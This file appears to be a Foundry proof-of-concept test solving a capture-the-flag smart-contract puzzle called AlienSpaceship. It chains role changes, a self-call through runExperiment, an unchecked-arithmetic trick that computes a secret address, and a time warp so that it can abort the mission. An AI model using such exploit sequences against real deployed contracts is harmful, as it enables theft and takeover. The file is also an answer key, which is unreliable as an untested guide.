// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {AlienSpaceship} from "src/AlienSpaceship.sol";

contract AlienSpaceship_POC is Test {
    AlienSpaceship _alienSpaceship;
    bytes32 public constant ENGINEER = keccak256("ENGINEER");
    bytes32 public constant PHYSICIST = keccak256("PHYSICIST");
    bytes32 public constant CAPTAIN = keccak256("CAPTAIN");
    bytes32 public constant BLOCKCHAIN_SECURITY_RESEARCHER = keccak256("BLOCKCHAIN_SECURITY_RESEARCHER");
    function init() private{
        vm.startPrank(address(0x10));
        _alienSpaceship = new AlienSpaceship();
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }
    function test_AlienSpaceship_POC() public{
        address my_address1 = address(uint160(uint256(keccak256("my address1"))));
        address my_address2 = address(uint160(uint256(keccak256("my address2"))));
        vm.startPrank(my_address1);
        _alienSpaceship.applyForJob(ENGINEER);
        _alienSpaceship.dumpPayload(4100e18);
        bytes memory data = abi.encodeWithSignature("applyForJob(bytes32)",ENGINEER);
        _alienSpaceship.runExperiment(data);
        _alienSpaceship.quitJob();
        _alienSpaceship.applyForJob(PHYSICIST);
        vm.warp(block.timestamp + 120);
        _alienSpaceship.enableWormholes();
        _alienSpaceship.applyForPromotion(CAPTAIN);
        uint160 _secret;
        unchecked {
            _secret=uint160(51)-uint160(my_address1);
        }
        _alienSpaceship.visitArea51(address(_secret));
        _alienSpaceship.jumpThroughWormhole(100_000e18,100_000e18,100_000e18);
        vm.stopPrank();
        vm.startPrank(my_address2);
        _alienSpaceship.applyForJob(ENGINEER);
        _alienSpaceship.dumpPayload(1000e18);
        vm.stopPrank();
        vm.startPrank(my_address1);
        _alienSpaceship.abortMission();
        vm.stopPrank();
        console.log("Success",_alienSpaceship.missionAborted());

    }
        
}